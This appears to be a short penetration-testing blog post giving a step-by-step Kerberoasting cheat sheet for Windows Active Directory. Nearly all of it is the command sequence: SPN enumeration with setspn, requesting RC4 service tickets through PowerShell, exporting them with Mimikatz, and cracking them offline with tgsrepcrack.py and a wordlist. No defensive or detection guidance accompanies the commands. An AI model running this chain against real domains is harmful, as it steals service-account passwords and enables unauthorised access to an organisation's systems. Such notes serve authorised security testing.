---
layout: single
classes: wide
author_profile: true
read_time: true
share: true
related: true
title:  "Internal Infrastructure Pentest - Kerberoasting"
date:   2019-07-07 15:30:10 +1000
categories:
  - Internal Pentest
  - Internal Infrastructure Pentest
  - Network Pentest
tags:
  - Kerberoasting
  - Windows Security
  - Active Directory Hacking
  - Kerberos
---
<pre>
- Firstly purge all the tickets
  - klist purge
  - klist
 
 - SPN scan for service accounts
    - setspn -T domain_name -F -Q */*
  
 - Now request Service Ticket (TGS) and it should be in RC4 encryption type
    - Add-Type -AssemblyName System.IdentityModel
    - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN Account'
    - klist
 
 - Export kerberos tickets using Mimikatz
    - mimikatz# kerberos::list /export
  
 - Copy exported service ticket to Kali for kerberoasting, based on the wordlist we would be able to crack the password
    - ./tgsrepcrack.py wordlist.txt ticket_name.kirbi
</pre>
